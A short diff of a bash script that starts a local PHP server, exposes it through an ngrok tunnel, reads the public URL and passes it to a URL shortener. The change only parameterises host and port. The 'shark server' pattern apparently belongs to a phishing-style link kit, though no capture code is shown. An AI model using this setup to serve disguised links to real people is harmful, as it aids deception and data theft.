@@ -349,7 +349,7 @@ function url_shortner() {
 
 # MAIN 
 function main() {
-        launch="starting shark server";splashdown="started shark server";printf "\n";connection;php -S 127.0.0.1:4444 > /dev/null 2>&1 & sleep 0.1;ngrok http 4444 > /dev/null 2>&1 & sleep 20 & spinner;link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io");url_shortner;
+        HOST="127.0.0.1" ; PORT="8080" ; launch="starting shark server";splashdown="started shark server";printf "\n";connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 0.1;ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io");url_shortner;
 }
 
 #banner2
